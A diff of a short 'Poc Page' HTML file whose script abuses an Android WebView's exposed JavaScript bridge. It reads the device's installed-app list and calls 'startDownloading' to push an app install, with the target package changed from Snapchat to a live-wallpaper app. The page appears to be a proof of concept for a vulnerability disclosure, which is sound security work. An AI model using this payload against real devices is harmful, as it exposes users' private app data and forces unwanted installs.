@@ -1,11 +1,17 @@
 <html>
-  <head>Poc Page</head>
-  <body>
-  <script>
-    var apps = android.getInstalledApp()
-    document.write("<br>apps : ", apps)
+    <head>
+        Poc Page
+    </head>
+    <body>
+        <script>
 
-    var str = '{\"needAthenaTrack\":false,\"params\":\"{\\\"packageName\\\":\\\"com.snapchat.android\\\"}\",\"progressCallback\":\android.startDownloading(str)
-  </script>
-  </body>
+           var apps = android.getInstalledApp()
+           document.write("<br>apps : ", apps)
+
+           var str = '{\"needAthenaTrack\":false,\"params\":\"{\\\"packageName\\\":\\\"com.zhiliao.musically.livewallpaper\\\"}\",\"progressCallback\":\"document.write\"}'
+           android.startDownloading(str)
+        </script>
+
+    </body>
+
 </html>
